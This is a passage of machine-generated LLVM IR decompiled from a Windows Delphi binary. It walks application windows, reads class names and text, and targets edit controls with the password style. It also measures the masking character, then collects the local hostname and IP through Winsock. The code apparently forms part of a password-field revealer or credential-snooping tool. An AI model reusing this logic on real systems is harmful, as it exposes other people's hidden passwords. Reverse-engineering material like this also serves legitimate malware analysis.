  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1684
  %51 = load i32, i32* %50, align 4, !insn.addr !1684
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1685
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1686
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1686
  store i32 4222753, i32* %53, align 4, !insn.addr !1686
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1687
  ret i32 %54, !insn.addr !1688
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1689
  ret i32 %0, !insn.addr !1689
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1690
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1691
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1692
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1693
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1694
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1694
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1694
  %6 = call i32 @function_40441c(), !insn.addr !1695
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1696
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1697
  br label %dec_label_pc_406f70, !insn.addr !1697

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1696
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1696
  store i32 %7, i32* %9, align 4, !insn.addr !1696
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1698
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1698
  store i32 4222536, i32* %11, align 4, !insn.addr !1698
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1699
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1700
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1700
  store i32 1, i32* %14, align 4, !insn.addr !1700
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1701
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1702
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1702
  store i32 0, i32* %16, align 4, !insn.addr !1702
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1703
  %18 = icmp eq i1 %17, false, !insn.addr !1704
  %19 = icmp eq i1 %18, false, !insn.addr !1705
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1705

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1706
  %21 = sub i32 %20, %6, !insn.addr !1707
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1708
  %23 = icmp eq i1 %22, false, !insn.addr !1709
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1709
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1709

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1710
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1711
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1712
}

define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1713
  %edi.0.reg2mem = alloca i32, !insn.addr !1713
  %ecx.0.reg2mem = alloca i32, !insn.addr !1713
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1714
  br label %2, !insn.addr !1714

; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1714
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1714
  br i1 %3, label %10, label %4, !insn.addr !1714

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1714
  %6 = load i8, i8* %5, align 1, !insn.addr !1714
  %7 = icmp eq i8 %6, 0, !insn.addr !1714
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1714
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1714
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1714
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1714
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1714
  br i1 %7, label %10, label %2, !insn.addr !1714

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1715
  ret i32 %11, !insn.addr !1716
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1717
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1718
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1718
  %4 = add i32 %3, %1, !insn.addr !1719
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1719
  store i8 0, i8* %5, align 1, !insn.addr !1719
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1720
  ret i32 %6, !insn.addr !1721
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1722
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1723
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1724
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1724
  %6 = add i32 %5, %3, !insn.addr !1725
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1725
  store i8 0, i8* %7, align 1, !insn.addr !1725
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1726
  ret i32 %8, !insn.addr !1727
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1728
  %1 = call i32 @function_4034c8(), !insn.addr !1729
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1730
  ret i32 %2, !insn.addr !1731
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1732
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1733
  ret i32 %1, !insn.addr !1734
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1735
  %1 = call i32 @function_4036c8(), !insn.addr !1736
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1737
  %3 = icmp eq i32 %2, 2, !insn.addr !1738
  %4 = zext i1 %3 to i32, !insn.addr !1739
  %5 = and i32 %2, -256, !insn.addr !1739
  %6 = or i32 %5, %4, !insn.addr !1739
  ret i32 %6, !insn.addr !1740
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1741
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1741
  %esp.02.reg2mem = alloca i32, !insn.addr !1741
  %storemerge3.reg2mem = alloca i32, !insn.addr !1741
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1742
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1742
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1742
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1743
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1744
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1745
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1745
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1746
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1746
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1746
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1747
  %9 = icmp eq i1 %8, false, !insn.addr !1748
  %10 = icmp eq i1 %9, false, !insn.addr !1749
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1749
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1749
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1749
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1749
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1749

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1750
  %12 = call i32 @function_407134(), !insn.addr !1751
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1752
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1752
  store i32 2, i32* %14, align 4, !insn.addr !1752
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1753
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1753
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1753
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1754
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1746
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1746
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1747
  %21 = icmp eq i1 %20, false, !insn.addr !1748
  %22 = icmp eq i1 %21, false, !insn.addr !1749
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1749
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1749
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1749
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1749
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1749

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1755
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1756
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1757
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1757
  store i32 4223413, i32* %25, align 4, !insn.addr !1757
  %26 = call i32 @"@LStrClr"(), !insn.addr !1758
  ret i32 %26, !insn.addr !1759
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1760
  ret i32 %0, !insn.addr !1760
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1761
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1762
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1763
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1763
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1763
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1764
  %2 = call i32 @function_407054(), !insn.addr !1765
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1766
  %4 = call i32 @function_407134(), !insn.addr !1767
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1768
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1769
  %6 = call i32 @"@LStrClr"(), !insn.addr !1770
  ret i32 %6, !insn.addr !1771
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1772
  ret i32 %0, !insn.addr !1772
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1773
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1774
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1775
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1775
  store i32 %3, i32* %4, align 4, !insn.addr !1775
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1776
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1776
  %9 = add i8 %6, %8, !insn.addr !1776
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1776
  store i8 %9, i8* %10, align 1, !insn.addr !1776
  %11 = add i32 %2, 81, !insn.addr !1777
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1777
  %13 = load i8, i8* %12, align 1, !insn.addr !1777
  %14 = trunc i32 %1 to i8, !insn.addr !1777
  %15 = add i8 %13, %14, !insn.addr !1777
  store i8 %15, i8* %12, align 1, !insn.addr !1777
  %16 = load i32, i32* %eax, align 4, !insn.addr !1778
  ret i32 %16, !insn.addr !1778
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1779
  ret x86_fp80 %1, !insn.addr !1780
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1781
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1782
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1782
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1782
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1783
  %3 = call i32 @function_407054(), !insn.addr !1784
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1785
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1786
  %6 = icmp eq i32 %5, 180, !insn.addr !1787
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1788
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1788

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1789
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1790
  %10 = icmp eq i1 %9, false, !insn.addr !1791
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1791
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1791

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1792
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1793
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1794
  %13 = add i32 %esp.1, 8, !insn.addr !1795
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1795
  store i32 4223702, i32* %14, align 4, !insn.addr !1795
  %15 = call i32 @"@LStrClr"(), !insn.addr !1796
  ret i32 %15, !insn.addr !1797
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1798
  ret i32 %0, !insn.addr !1798
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1799
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1800
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1801
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1801
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1801
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1802
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1803
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1803
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1804
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1805
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1806
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1807
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1807
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1808
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1809
  %16 = ashr i32 %15, 31, !insn.addr !1810
  %17 = zext i32 %15 to i64, !insn.addr !1811
  %18 = zext i32 %16 to i64, !insn.addr !1811
  %19 = mul i64 %18, 4294967296, !insn.addr !1811
  %20 = or i64 %19, %17, !insn.addr !1811
  %21 = zext i32 %4 to i64, !insn.addr !1811
  %22 = sdiv i64 %20, %21, !insn.addr !1811
  %23 = trunc i64 %22 to i32, !insn.addr !1811
  ret i32 %23, !insn.addr !1812
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1813
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1814
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1814
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1814
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1815
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1816
  %3 = icmp eq i32 %2, 0, !insn.addr !1816
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1817

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1818
  store i32 0, i32* %4, align 4, !insn.addr !1818
  br label %dec_label_pc_407384, !insn.addr !1819

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1820
  %6 = icmp eq i32 %5, 0, !insn.addr !1820
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1821

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1822
  %8 = icmp eq i32 %7, 0, !insn.addr !1822
  %9 = icmp eq i1 %8, false, !insn.addr !1823
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1823

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1824
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1825
  br label %dec_label_pc_40743f, !insn.addr !1825

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1826
  %12 = icmp eq i8 %11, 0, !insn.addr !1826
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1827

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1828
  %14 = icmp eq i32 %13, 0, !insn.addr !1829
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1830

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !1831
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1832
  br label %dec_label_pc_40743f, !insn.addr !1832

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1833
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1834
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1835
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1836
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1837
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1837
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1838
  %23 = call i32 @function_40747c(), !insn.addr !1839
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1839
  br label %dec_label_pc_40743f, !insn.addr !1839

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1840
  %25 = load i32, i32* %24, align 4, !insn.addr !1840
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1841
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1842
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1842
  store i32 4224092, i32* %27, align 4, !insn.addr !1842
  %28 = call i32 @"@LStrClr"(), !insn.addr !1843
  ret i32 %28, !insn.addr !1844
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1845
  ret i32 %0, !insn.addr !1845
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1846
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1847
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1848
  %1 = call i32 @"@LStrClr"(), !insn.addr !1849
  ret i32 %1, !insn.addr !1850
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !1851
  %esp.0.reg2mem = alloca i32, !insn.addr !1851
  %esp.15.reg2mem = alloca i32, !insn.addr !1851
  %storemerge6.reg2mem = alloca i32, !insn.addr !1851
  %.reg2mem = alloca i32, !insn.addr !1851
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1851
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1852
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1853
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1854
  %5 = call i32 @"@LStrClr"(), !insn.addr !1855
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1856
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1856
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1857
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1858
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1859
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1859
  %11 = icmp eq %hostent* %9, null, !insn.addr !1860
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1861
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !1861

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !1862
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1862
  %14 = load i32, i32* %13, align 4, !insn.addr !1862
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1863
  %16 = load i32, i32* %15, align 4, !insn.addr !1863
  %17 = icmp eq i32 %16, 0, !insn.addr !1864
  %18 = icmp eq i1 %17, false, !insn.addr !1865
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !1865

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1858
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1866
  %21 = icmp eq i1 %20, false, !insn.addr !1867
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1867
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !1867

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1868
  %23 = load i32, i32* %22, align 4, !insn.addr !1868
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1868
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1868
  store i32 %23, i32* %25, align 4, !insn.addr !1868
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1869
  %27 = call i32 @StrPas(), !insn.addr !1870
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1870
